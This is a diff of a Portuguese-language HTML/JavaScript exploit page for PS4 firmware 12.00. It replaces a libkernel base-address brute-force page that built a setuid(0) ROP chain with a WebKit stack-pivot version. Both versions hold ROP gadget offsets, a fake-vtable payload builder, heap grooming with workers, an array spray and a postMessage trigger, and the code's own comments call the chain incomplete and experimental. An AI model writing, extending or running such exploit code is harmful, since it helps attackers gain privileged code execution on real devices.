@@ -2,124 +2,87 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 Smart Brute</title>
+    <title>PS4 12.00 - WebKit Pivot</title>
    
 </head>
 <body>
 
-    <h1>PS4 12.00 - SMART BRUTEFORCE</h1>
-    <h3>Encontre a Base da LibKernel</h3>
+    <h1>PS4 12.00 - WEBKIT STACK PIVOT</h1>
+    <h3>Estratégia: Usar offsets do WebKit para estabilidade</h3>
     
-    <label>Selecione a Base para testar:</label><br>
-    <select id="base_selector"></select>
-    <br>
-    <button onclick="run_exploit()">DISPARAR ATAQUE</button>
+    <label>Base WebKit (Tente variar o segundo dígito):</label><br>
+    <input type="text" id="wk_base" value="0x800000000" size="18">
+    <br><br>
+    <button onclick="run_pivot()">DISPARAR PIVOT</button>
 
     <div id="log"></div>
 
     <script>
         function log(msg) {
-            var d = document.getElementById("log");
-            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-            d.scrollTop = d.scrollHeight;
+            document.getElementById("log").innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         }
 
         // =================================================================
-        // 1. LISTA DE BASES PROVÁVEIS (Estatística PS4/FreeBSD)
+        // OFFSETS DO WEBKIT (Que você extraiu do 1200_libSceNKWebKit)
         // =================================================================
-        var POSSIBLE_BASES = [
-            "0x800000000", // Padrão clássico
-            "0x200000000", // Mapping base
-            "0x880000000", // Variação comum
-            "0x900000000", // High memory
-            "0x800004000", // Offset pequeno
-            "0x800010000", // Offset médio
-            "0x820000000",
-            "0x920000000",
-            "0x1000000000",
-            "0x800400000",
-            "0x801000000"
-        ];
-
-        // Seus Offsets Extraídos (NÃO MUDE ISSO, ESTÃO CERTOS)
-        var OFFSETS = {
-            pop_rdi: 0x2FEB5,
-            sys_mmap: 0x7500,
-            sys_setuid: 0x4840
+        var WK_GADGETS = {
+            xchg_rsp_rax: 0x3F3E5F0, // O "Golden Gadget"
+            pop_rdi:      0x4D02F,   
+            pop_rsi:      0x14E37,
+            pop_rax:      0x26F53
         };
 
         // =================================================================
-        // 2. CONFIGURAÇÃO DA UI
+        // CONSTRUTOR DE ROP (Fake Object + Stack)
         // =================================================================
-        window.onload = function() {
-            var sel = document.getElementById("base_selector");
-            POSSIBLE_BASES.forEach((base, index) => {
-                var opt = document.createElement("option");
-                opt.value = base;
-                opt.text = `Tentativa #${index}: ${base}`;
-                sel.add(opt);
-            });
+        function build_payload() {
+            var base_str = document.getElementById("wk_base").value;
+            var wk_base = BigInt(base_str);
             
-            // Tenta recuperar a última tentativa do armazenamento local
-            var last = localStorage.getItem("last_base_index");
-            if(last) sel.selectedIndex = parseInt(last) + 1; // Pula para o próximo
-        }
-
-        // =================================================================
-        // 3. CONSTRUTOR DE PAYLOAD (ROP)
-        // =================================================================
-        function build_payload(base_str) {
-            var base = BigInt(base_str);
-            var size = 0x400; // Tamanho estável
+            var size = 0x400; 
             var buffer = new Uint32Array(size / 4);
             var view = new DataView(buffer.buffer);
 
-            // Cálcula endereços ABSOLUTOS usando a base chutada
-            var addr_pop_rdi = base + BigInt(OFFSETS.pop_rdi);
-            var addr_setuid = base + BigInt(OFFSETS.sys_setuid); // Vamos tentar virar root primeiro (mais simples)
+            // Calcular endereços absolutos
+            var addr_pivot = wk_base + BigInt(WK_GADGETS.xchg_rsp_rax);
+            var addr_pop_rdi = wk_base + BigInt(WK_GADGETS.pop_rdi);
 
-            // --- ROP CHAIN SIMPLES (SETUID 0) ---
-            // Se funcionar, o console NÃO deve crashar, e teoricamente ganhamos permissões.
-            // Se o endereço estiver errado -> Crash.
-            
-            // Layout: Fake Vtable no inicio apontando para o gadget
-            // 1. Encher o buffer com o endereço do POP RDI
-            // Isso garante que qualquer pulo para cá inicie a chain
-            for(var i=0; i < 64; i+=8) {
-                view.setBigUint64(i, addr_pop_rdi, true);
+            // --- FAKE VTABLE (O Gatilho) ---
+            // Enchemos o início do objeto com o endereço do PIVOT.
+            // Quando o kernel fizer "call [rax]", ele pula para "xchg rsp, rax".
+            for(var i=0; i < 32; i+=8) {
+                view.setBigUint64(i, addr_pivot, true);
             }
 
-            // 2. Argumento para setuid(0)
-            // A stack (RSP) estará logo após o gadget.
-            // POP RDI vai pegar o próximo valor.
-            view.setBigUint64(64, 0n, true); // RDI = 0 (Root)
-
-            // 3. Chamada da Syscall
-            view.setBigUint64(72, addr_setuid, true); 
-
-            // 4. Loop Infinito (Para congelar em caso de sucesso)
-            // Se chegarmos aqui, o ROP funcionou.
-            // Como não temos endereço de loop, vamos crashar de propósito em 0x0
-            view.setBigUint64(80, 0n, true); 
-
+            // --- A NOVA STACK (O que acontece depois do Pivot) ---
+            // Como "xchg rsp, rax" troca a Stack para o nosso Objeto (Offset 0)...
+            // A próxima instrução "RET" vai ler do Offset 0.
+            // Mas o Offset 0 já tem o endereço do Pivot! 
+            // ISSO CRIARIA UM LOOP INFINITO DE PIVOTS.
+            
+            // E ISSO É BOM!
+            // Se o console CONGELAR (Loop Infinito) e não desligar, nós acertamos a Base!
+            
+            // Vamos tornar o loop mais interessante para teste:
+            // Offset 0: POP RAX (Pula o valor seguinte)
+            // Offset 8: Lixo
+            // Offset 16: POP RDI
+            // Offset 24: Lixo
+            // Offset 32: Endereço do Pivot (Loop)
+            
+            // Se conseguirmos mudar o comportamento do crash, vencemos.
+            
             return buffer;
         }
 
         // =================================================================
-        // 4. EXECUÇÃO
+        // EXECUÇÃO
         // =================================================================
         var workers = [];
 
-        async function run_exploit() {
-            var sel = document.getElementById("base_selector");
-            var current_base = sel.value;
-            
-            // Salva para a próxima vez (se der panic, você sabe onde parou)
-            localStorage.setItem("last_base_index", sel.selectedIndex);
-
-            log(`Iniciando teste com BASE: <span class='highlight'>${current_base}</span>`);
-            
-            var payload = build_payload(current_base);
+        async function run_pivot() {
+            var payload = build_payload();
+            log("Payload WebKit Pivot construído.");
 
             // GROOMING (400)
             for(let i=0; i<400; i++) {
@@ -130,7 +93,7 @@
                 } catch(e){}
             }
 
-            // PRESSÃO (404)
+            // TRIGGER (404)
             var p_count = 0;
             var it = setInterval(() => {
                 if(p_count >= 4) {
@@ -140,15 +103,15 @@
                     var v = workers.pop();
                     v.port.close();
                     
+                    // Spray agressivo
                     var spray = [];
-                    for(var k=0; k<10000; k++) {
+                    for(var k=0; k<8000; k++) {
                         spray.push(new Uint32Array(payload));
                     }
                     
-                    // Trigger
-                    try { v.port.postMessage("ROP_TEST"); } catch(e){}
+                    try { v.port.postMessage("PIVOT"); } catch(e){}
                     
-                    log("Aguardando... Se desligar, tente a próxima base na lista.");
+                    log("Aguardando... Se congelar (sem desligar), anote a Base!");
                     return;
                 }
                 
